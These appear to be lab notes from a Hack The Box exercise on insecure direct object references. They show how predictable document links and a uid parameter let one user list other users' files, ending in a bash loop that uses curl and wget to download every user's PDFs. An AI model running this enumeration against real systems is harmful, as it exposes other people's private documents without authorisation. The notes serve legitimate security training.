## Insecure Parameters
![](Pasted%20image%2020260720211613.png)
![](Pasted%20image%2020260720211629.png)
Checking the file links, we see that they have individual names:

```html
/documents/Invoice_1_09_2021.pdf 
/documents/Report_1_10_2021.pdf
```
![](Pasted%20image%2020260720211707.png)
## Mass Enumeration

```html
<li class='pure-tree_link'><a href='/documents/Invoice_3_06_2020.pdf' target='_blank'>Invoice</a></li> 
<li class='pure-tree_link'><a href='/documents/Report_3_01_2020.pdf' target='_blank'>Report</a></li>
```

```shell
3kjS@htb[/htb]$ curl -s "http://SERVER_IP:PORT/documents.php?uid=3" | grep "<li class='pure-tree_link'>" 

<li class='pure-tree_link'><a href='/documents/Invoice_3_06_2020.pdf' target='_blank'>Invoice</a></li> 
<li class='pure-tree_link'><a href='/documents/Report_3_01_2020.pdf' target='_blank'>Report</a></li>
```

```shell
3kjS@htb[/htb]$ curl -s "http://SERVER_IP:PORT/documents.php?uid=3" | grep -oP "\/documents.*?.pdf" 

/documents/Invoice_3_06_2020.pdf 
/documents/Report_3_01_2020.pdf
```

```bash
#!/bin/bash 

url="http://SERVER_IP:PORT" 

for i in {1..10}; do 
		for link in $(curl -s "$url/documents.php?uid=$i" | grep -oP "\/documents.*?.pdf"); do 
			wget -q $url/$link 
	done 
done
```
